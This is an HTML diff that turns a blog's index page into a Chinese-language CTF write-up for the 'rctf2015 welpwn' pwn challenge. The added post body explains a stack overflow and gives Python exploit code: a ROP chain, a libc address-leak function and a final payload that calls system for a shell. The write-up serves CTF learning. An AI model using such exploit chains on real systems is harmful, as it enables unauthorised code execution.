@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sunichi.github.io">
-  <title>Sunichi&#39;s Blog</title>
+  <title>rctf2015 welpwn writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sunichi&#39;s Blog">
-<meta property="og:url" content="https://sunichi.github.io/index.html">
+  <meta name="description" content="buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下    size data     0x10 s1   0x08 saved ebp   0x08 return address   0x400 buf    构造如下payload：">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rctf2015 welpwn writeup">
+<meta property="og:url" content="https://sunichi.github.io/2018/01/09/rctf15-welpwn/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下    size data     0x10 s1   0x08 saved ebp   0x08 return address   0x400 buf    构造如下payload：">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-01-09T00:58:01.657Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunichi&#39;s Blog">
+<meta name="twitter:title" content="rctf2015 welpwn writeup">
+<meta name="twitter:description" content="buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下    size data     0x10 s1   0x08 saved ebp   0x08 return address   0x400 buf    构造如下payload：">
   
     <link rel="alternative" href="/atom.xml" title="Sunichi&#39;s Blog" type="application/atom+xml">
   
@@ -148,16 +153,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-rctf15-welpwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-rctf15-welpwn" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/09/rctf15-welpwn/">rctf2015 welpwn writeup</a>
+    <h1 class="article-title" itemprop="name">
+      rctf2015 welpwn writeup
     </h1>
   
 
@@ -198,12 +201,39 @@
 </tr>
 </tbody>
 </table>
-<p>构造如下<code>payload</code>：<br>
-        
-          <a class="article-more-a" href="/2018/01/09/rctf15-welpwn/#more">more >></a>
-        
+<p>构造如下<code>payload</code>：<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">24</span> + return_addr</span><br></pre></td></tr></table></figure></p>
+<p>由于字符串复制遇<code>\x00</code>终止，因此最多只能传入一个地址。但由于返回地址之后就是我们所输入的<code>buf</code>，所以需要利用<code>buf</code>进行控制。<code>buf</code>的前32字节为上述<code>payload</code>，因此需要利用gadget从栈中移除32字节，使用pop四次返回即可，随后便进入预先设计好的控制流中。由于原先的返回地址非<code>\x00</code>长度与<code>pop4_addr</code>相同，因此可以成功写入。leak函数设计如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">24</span> + p64(pop4_addr)</span><br><span class="line">    payload += p64(pop6_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr) + <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">    payload += p64(start_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x400</span>, <span class="string">'a'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    p.recv(<span class="number">0x400</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
+<p>获取<code>system</code>地址后：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">24</span> + p64(pop4_addr)</span><br><span class="line">payload += p64(pop6_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(call_addr) + <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload += p64(poprdi_addr) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">'a'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<blockquote>
+<p>参考文章和bin下载：<a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p>
+</blockquote>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -227,16 +257,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/01/09/rctf15-welpwn/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/01/09/rctf15-welpwn/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/07/lctf16-pwn100/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">lctf15 pwn100 writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -256,251 +345,14 @@
 
 
 
-
   
-    <article id="post-lctf16-pwn100" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/07/lctf16-pwn100/">lctf15 pwn100 writeup</a>
-    </h1>
   
 
-        
-        <a href="/2018/01/07/lctf16-pwn100/" class="archive-article-date">
-  	<time datetime="2018-01-07T03:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>使用ida查看程序，在函数<code>0x40063d</code>中有<code>read</code>函数，读取用户输入的200个字节。接着调用<code>puts</code>函数输出。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2018/01/07/lctf16-pwn100/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/01/07/lctf16-pwn100/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-xdctf15-pwn200" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/06/xdctf15-pwn200/">xdctf15 pwn200 writeup</a>
-    </h1>
   
 
-        
-        <a href="/2018/01/06/xdctf15-pwn200/" class="archive-article-date">
-  	<time datetime="2018-01-06T09:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>为栈溢出，溢出点为buf，长度0x6C，read可输入0x100。溢出偏移为112。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u); <span class="comment">// buf length: 0x6C</span></span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2018/01/06/xdctf15-pwn200/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/01/06/xdctf15-pwn200/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwnable-tw-start" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/05/pwnable-tw-start/">Pwnable.tw start writeup</a>
-    </h1>
   
 
-        
-        <a href="/2018/01/05/pwnable-tw-start/" class="archive-article-date">
-  	<time datetime="2018-01-05T10:33:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>使用ida查看程序，首先保存esp和_exit地址，随后将输出的字符串压栈：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push esp</span><br><span class="line">push offset _exit</span><br><span class="line">xor eax, eax ; ebx, ecx, edx</span><br><span class="line">push &apos;Let&apos;s start the CTF:&apos;</span><br><span class="line">mov ecx esp ; addr</span><br><span class="line">mov dl, 14h ; len</span><br><span class="line">mov bl, 1   ; fd</span><br><span class="line">mov al, 4   ; syscall num, write</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2018/01/05/pwnable-tw-start/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/01/05/pwnable-tw-start/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
 
 
@@ -523,8 +375,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
